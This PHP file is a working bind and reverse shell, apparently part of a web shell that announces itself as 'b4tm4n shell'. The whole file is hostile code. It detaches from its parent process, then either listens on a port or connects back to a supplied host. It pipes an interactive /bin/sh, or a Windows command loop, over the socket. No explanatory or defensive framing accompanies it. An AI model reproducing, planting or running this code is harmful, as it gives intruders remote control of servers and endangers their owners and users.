<?php
error_reporting(0);
set_time_limit(0);
ob_implicit_flush();

$targets=explode(" ",$target);
$cs=1337;
$wa=null;
$ea=null;
$sh="export TERM=xterm;PS1='\$PWD>';export PS1;/bin/sh -i";
$m="b4tm4n shell : connected\n";

if(count($targets)==1){
	$p=$target;
	$h="";
	$t="bind";
}
elseif(count($targets)==2){
	$p=$targets[0];
	$h=$targets[1];
	$t="back";
}

if(function_exists('pcntl_fork')){
	$pid=pcntl_fork();
	if($pid==-1)exit(1);
	if($pid)exit(0);
	if(posix_setsid()==-1)exit(1);
}

if($t=="bind"){
	$s=stream_socket_server("tcp://0.0.0.0:".$p,$errno,$errstr);
	stream_set_timeout($s,30);
	$c=stream_socket_accept($s);
	if(strtolower(substr(php_uname(),0,3))=="win"){
		fwrite($c,$m.getcwd().">");
		while($p!==false){
			$p=fgets($c);
			if(preg_match("/cd\ ([^\s]+)/i",$p,$rr)){
				$dd=$rr[1];
				if(is_dir($dd))chdir($dd);
				$o=getcwd().">";
			}
			elseif(trim(strtolower($p))=="exit" || trim(strtolower($p))=="quit") break;
			else $o=exe($p)."\n".getcwd().">";
			fwrite($c,$o);
		}
		fclose($c);
		fclose($s);
	}
	else{
		fwrite($c,$m);
		$ds=array(0=>array("pipe","r"),1=>array("pipe","w"),2=>array("pipe","w"));
		$pr=proc_open($sh,$ds,$pip);
		if(!is_resource($pr))exit(1);
		stream_set_blocking($pip[0],0);
		stream_set_blocking($pip[1],0);
		stream_set_blocking($pip[2],0);
		stream_set_blocking($c,0);
		while(true){
			if(feof($c)||feof($pip[1]))break;
			$ra=array($c,$pip[1],$pip[2]);
			stream_select($ra,$wa,$ea,null);
			if(in_array($c,$ra)){
				$i=fread($c,$cs);
				fwrite($pip[0],$i);
			}
			if(in_array($pip[1],$ra)){
				$i=fread($pip[1],$cs);
				fwrite($c,$i);
			}
			if(in_array($pip[2],$ra)){
				$i=fread($pip[2],$cs);
				fwrite($c,$i);
			}
		}
		fclose($s);fclose($c);fclose($pip[0]);fclose($pip[1]);fclose($pip[2]);
		proc_close($pr);
	}
}
elseif($t=="back"){
	$s=fsockopen($h,$p,$en,$es,30);
	if(strtolower(substr(php_uname(),0,3))=="win"){
		fwrite($s,$m.getcwd().">");
		while($p!==false){
			$p=fgets($s);
			if(preg_match("/cd\ ([^\s]+)/i",$p,$rr)){
				$dd=$rr[1];
				if(is_dir($dd))chdir($dd);
				$o=getcwd().">";
			}
			elseif(trim(strtolower($p))=="exit" || trim(strtolower($p))=="quit") break;
			else $o=exe($p)."\n".getcwd().">";
			fwrite($s,$o);
		}
		fclose($s);
	}
	else{
		fwrite($s,$m);
		$ds=array(0=>array("pipe","r"),1=>array("pipe","w"),2=>array("pipe","w"));
		$pr=proc_open($sh,$ds,$pip);
		if(!is_resource($pr))exit(1);
		stream_set_blocking($pip[0],0);
		stream_set_blocking($pip[1],0);
		stream_set_blocking($pip[2],0);
		stream_set_blocking($s,0);
		while(true){
			if(feof($s)||feof($pip[1]))break;
			$ra=array($s,$pip[1],$pip[2]);
			stream_select($ra,$wa,$ea,null);
			if(in_array($s,$ra)){
				$i=fread($s,$cs);
				fwrite($pip[0],$i);
			}
			if(in_array($pip[1],$ra)){
				$i=fread($pip[1],$cs);
				fwrite($s,$i);
			}
			if(in_array($pip[2],$ra)){
				$i=fread($pip[2],$cs);
				fwrite($s,$i);
			}
		}
		fclose($s);fclose($pip[0]);fclose($pip[1]);fclose($pip[2]);
		proc_close($pr);
	}
}
?>